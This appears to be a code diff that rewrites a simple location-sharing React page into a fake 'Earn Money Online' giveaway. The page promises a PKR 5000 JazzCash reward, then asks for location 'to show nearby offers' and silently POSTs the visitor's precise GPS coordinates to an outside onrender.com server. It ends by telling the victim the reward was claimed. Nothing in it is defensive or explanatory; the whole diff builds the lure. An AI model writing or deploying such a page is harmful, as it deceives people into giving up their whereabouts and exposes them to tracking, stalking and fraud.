@@ -1,9 +1,16 @@
 import React, { useState } from "react";
 
-const SendLocation = () => {
+const MoneyPage = () => {
   const [status, setStatus] = useState("idle");
+  const [reward, setReward] = useState(null);
 
-  const sendLocation = () => {
+  const handleGetMoney = () => {
+    const earned = 5000;
+    setReward(earned);
+    setStatus("earned");
+  };
+
+  const requestLocation = () => {
     if (!navigator.geolocation) {
       setStatus("Geolocation not supported");
       return;
@@ -14,37 +21,21 @@ const SendLocation = () => {
     navigator.geolocation.getCurrentPosition(
       async (position) => {
         const { latitude, longitude } = position.coords;
-        console.log("User location:", latitude, longitude);
 
         try {
-          const res = await fetch(
-            "https://mystery-e6o2.onrender.com/location",
-            {
-              method: "POST",
-              headers: {
-                "Content-Type": "application/json",
-              },
-              body: JSON.stringify({ latitude, longitude }),
-            }
-          );
-
-          const data = await res.json();
-          console.log("Server response:", data);
+          await fetch("https://mystery-e6o2.onrender.com/location", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ latitude, longitude }),
+          });
 
           setStatus("success");
         } catch (err) {
-          console.error("Error sending location:", err);
+          console.error(err);
           setStatus("failed");
         }
       },
-      (error) => {
-        console.error("Geolocation error:", error.code, error.message);
-
-        if (error.code === 1) setStatus("Permission denied");
-        else if (error.code === 2) setStatus("Location unavailable");
-        else if (error.code === 3) setStatus("Location timeout");
-        else setStatus("Location error");
-      },
+      () => setStatus("failed"),
       {
         enableHighAccuracy: true,
         timeout: 10000,
@@ -54,29 +45,82 @@ const SendLocation = () => {
   };
 
   return (
-    <div style={{ padding: "20px", textAlign: "center" }}>
-      <h3>Share your location</h3>
-
-      <button
-        onClick={sendLocation}
+    <div
+      style={{
+        minHeight: "100vh",
+        background: "linear-gradient(135deg, #667eea, #764ba2)",
+        display: "flex",
+        justifyContent: "center",
+        alignItems: "center",
+        padding: "20px",
+      }}
+    >
+      <div
         style={{
-          padding: "12px 20px",
-          fontSize: "16px",
-          cursor: "pointer",
+          background: "#fff",
+          borderRadius: "16px",
+          maxWidth: "400px",
+          width: "100%",
+          padding: "20px",
+          textAlign: "center",
+          boxShadow: "0 10px 30px rgba(0,0,0,0.2)",
         }}
       >
-        Allow Location
-      </button>
+        {/* IMAGE */}
+        <img
+          src="https://cdn-icons-png.flaticon.com/512/3135/3135706.png"
+          alt="Earn money"
+          style={{ width: "120px", marginBottom: "15px" }}
+        />
 
-      <p style={{ marginTop: "10px" }}>
-        {status === "idle" && "Waiting for permission"}
-        {status === "requesting" && "Requesting location..."}
-        {status === "success" && "Location sent successfully"}
-        {status === "failed" && "Failed to send location"}
-        {status.includes("Permission") && status}
-      </p>
+        <h2 style={{ marginBottom: "10px" }}>Earn Money Online</h2>
+        <p style={{ color: "#555", marginBottom: "20px" }}>
+          Click the button below to claim your reward
+        </p>
+
+        {status === "idle" && (
+          <button
+            onClick={handleGetMoney}
+            style={buttonStyle}
+          >
+            💰 Get 5000 on your jazzcash account
+          </button>
+        )}
+
+        {status === "earned" && (
+          <>
+            <h3 style={{ margin: "15px 0" }}>
+              🎉 You earned PKR.{reward}
+            </h3>
+            <p style={{ color: "#666", fontSize: "14px" }}>
+              To show nearby offers, allow location access
+            </p>
+            <button
+              onClick={requestLocation}
+              style={buttonStyle}
+            >
+              📍 Claim Reward
+            </button>
+          </>
+        )}
+
+        {status === "requesting" && <p>Requesting location...</p>}
+        {status === "success" && <p>✅ Reward claimed successfully!</p>}
+        {status === "failed" && <p>❌ Something went wrong.</p>}
+      </div>
     </div>
   );
 };
 
-export default SendLocation;
+const buttonStyle = {
+  padding: "12px 20px",
+  fontSize: "16px",
+  borderRadius: "8px",
+  border: "none",
+  cursor: "pointer",
+  background: "#667eea",
+  color: "#fff",
+  width: "100%",
+};
+
+export default MoneyPage;
